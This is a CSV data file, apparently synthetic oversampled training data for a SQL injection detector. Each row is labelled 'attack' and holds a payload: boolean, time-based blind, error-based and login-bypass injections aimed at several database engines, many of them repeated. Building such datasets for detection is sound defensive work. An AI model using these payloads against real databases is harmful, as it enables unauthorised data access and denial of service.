SMOTE_000240,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000069,2.1130210591938026
SMOTE_000241,attack,boolean,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000043,1.6383460848404732
SMOTE_000242,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000071,0.3061408182142519
SMOTE_000243,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000065,0.20508920221730942
SMOTE_000244,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,0.0031373692554531513
SMOTE_000245,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000017,0.07814755922657059
SMOTE_000246,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,0.1542645667951646
SMOTE_000247,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000069,0.12468875434293783
SMOTE_000248,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,1.8603907821349575
SMOTE_000249,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000047,1.398933082257144
SMOTE_000250,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,1.0747254208951271
SMOTE_000251,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,0.42227344911722425
SMOTE_000252,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000016,2.1738683315368474
SMOTE_000253,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000017,0.3797462555609806
SMOTE_000254,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000002,1.1754313381307409
SMOTE_000255,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000050,0.2004638658278028
SMOTE_000256,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000031,2.08600481006493
SMOTE_000257,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000054,1.3318112394901152
SMOTE_000258,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000035,2.0344619175799883
SMOTE_000259,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,0.3319867950592433
SMOTE_000260,attack,boolean,"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000072,0.06721046265946001
SMOTE_000261,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000021,1.1371436962136143
SMOTE_000262,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000053,0.012348649554748722
SMOTE_000263,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,3.406310589134988
SMOTE_000264,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000021,0.6120060389359367
SMOTE_000265,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000066,1.8464719975225152
SMOTE_000266,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,0.03272004282366465
SMOTE_000267,attack,boolean,"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000009,0.030367391516895076
SMOTE_000268,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000007,2.3726727605934936
SMOTE_000269,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000028,0.16282674138229838
SMOTE_000270,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000076,2.2699380701641276
SMOTE_000271,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000069,0.7521141230194063
SMOTE_000272,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000048,0.8800297310531775
SMOTE_000273,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000049,2.394325152921223
SMOTE_000274,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000049,1.1708238642029807
SMOTE_000275,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000020,0.27468995989996553
SMOTE_000276,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000031,0.20998428576523945
SMOTE_000277,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",nearest_attack_euclidean,R000036,2.6151167796349846
SMOTE_000278,attack,boolean,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000043,0.1862397172111852
SMOTE_000279,attack,boolean,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kkim""  =  ""kkim",nearest_attack_euclidean,R000045,2.296135516885685
SMOTE_000280,attack,boolean,"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000044,0.0541576437765307
SMOTE_000281,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000026,0.9888267472486026
SMOTE_000282,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000034,0.8380422093814778
SMOTE_000283,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,1.1300240103260966
SMOTE_000284,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000040,1.398802213975334
SMOTE_000285,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000014,1.3431502878323518
SMOTE_000286,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000017,1.584046458137433
SMOTE_000287,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000077,2.3009037399418983
SMOTE_000288,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000054,0.8438002068417535
SMOTE_000289,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000051,1.3444520780537328
SMOTE_000290,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,0.34273946623337126
SMOTE_000291,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000053,1.7528073684391199
SMOTE_000292,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000028,0.667633149966113
SMOTE_000293,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000020,1.39675245369777
SMOTE_000294,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000022,1.9460840129593484
SMOTE_000295,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,0.2937657864456985
SMOTE_000296,attack,boolean,"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000072,1.3371055767276345
SMOTE_000297,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000054,2.305330722432539
SMOTE_000298,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000021,0.9725733305313606
SMOTE_000299,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000026,1.8193355367760844
SMOTE_000300,attack,boolean,-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg,nearest_attack_euclidean,R000056,5.476433410812761
SMOTE_000301,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000064,0.8771296844832466
SMOTE_000302,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,0.05467899177093897
SMOTE_000303,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000035,0.7295294500346893
SMOTE_000304,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,1.65381516913749
SMOTE_000305,attack,boolean,"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000044,1.2396349325473999
SMOTE_000306,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000028,1.84646628666668
SMOTE_000307,attack,boolean,"1""   )    )    as wnzf where 3352  =  3352 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000030,0.18001325600310514
SMOTE_000308,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000016,1.7494242018893353
SMOTE_000309,attack,boolean,"1""   )    )    as wnzf where 3352  =  3352 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000030,0.4293693113377788
SMOTE_000310,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,0.964533608457338
SMOTE_000311,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000010,0.37927416103549133
SMOTE_000312,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000061,0.44824289068504974
SMOTE_000313,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000063,0.4367401715132105
SMOTE_000314,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000021,2.2457840385272623
SMOTE_000315,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000040,0.6497183485270276
SMOTE_000316,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000002,1.829806637211814
SMOTE_000317,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000050,0.7599670030263859
SMOTE_000318,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000014,0.02054316305462363
SMOTE_000319,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000028,0.5199654747262831
SMOTE_000320,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,2.203810481310678
SMOTE_000321,attack,boolean,"-8919"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""nstr""  =  ""nstr",nearest_attack_euclidean,R000075,3.660171596606378
SMOTE_000322,attack,boolean,-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000013,0.7784463533515301
SMOTE_000323,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000010,0.13327609750519823
SMOTE_000324,attack,boolean,"-8919"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""nstr""  =  ""nstr",nearest_attack_euclidean,R000075,1.886639110888649
SMOTE_000325,attack,boolean,-1989%'   )    )    or 6179  =  8518#,nearest_attack_euclidean,R000067,1.5658178613274811
SMOTE_000326,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000048,1.505022364397991
SMOTE_000327,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000020,0.5238554315429234
SMOTE_000328,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000026,1.5806388136511529
SMOTE_000329,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,0.2713354204122449
SMOTE_000330,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000071,1.1017523441156003
SMOTE_000331,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000052,0.10181716078577686
SMOTE_000332,attack,boolean,"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000072,0.2949541421332535
SMOTE_000333,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000020,1.8729129445211399
SMOTE_000334,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,3.9145177990199724
SMOTE_000335,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,5.760316614742284
SMOTE_000336,attack,boolean,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kkim""  =  ""kkim",nearest_attack_euclidean,R000045,1.2805111800181692
SMOTE_000337,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000055,0.2416938189513828
SMOTE_000338,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,1.0885749430355685
SMOTE_000339,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000020,0.8762732014150112
SMOTE_000340,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",nearest_attack_euclidean,R000039,0.8741071386915038
SMOTE_000341,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000014,1.0294275129414905
SMOTE_000342,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000071,1.1108862363105378
SMOTE_000343,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000029,2.2158476218949645
SMOTE_000344,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000035,0.547113110445682
SMOTE_000345,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000054,1.377771601889936
SMOTE_000346,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,0.16475691771832374
SMOTE_000347,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,0.6549982145773093
SMOTE_000348,attack,boolean,"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000032,1.8445776977937336
SMOTE_000349,attack,boolean,"1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000070,1.3513895150557838
SMOTE_000350,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000026,0.004974841440236964
SMOTE_000351,attack,boolean,"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000008,3.366190800912619
SMOTE_000352,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000049,0.22638098768213713
SMOTE_000353,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000001,0.11561595609619367
SMOTE_000354,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,1.055961603418362
SMOTE_000355,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000016,1.8883452273171013
SMOTE_000356,attack,boolean,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kkim""  =  ""kkim",nearest_attack_euclidean,R000045,1.2598058192242818
SMOTE_000357,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000022,0.9184611700055998
SMOTE_000358,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000062,4.469890931524118
SMOTE_000359,attack,boolean,admin' or '1'  =  '1'/*,nearest_attack_euclidean,R000004,3.4159111083619154
SMOTE_000360,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000010,1.2158851134735005
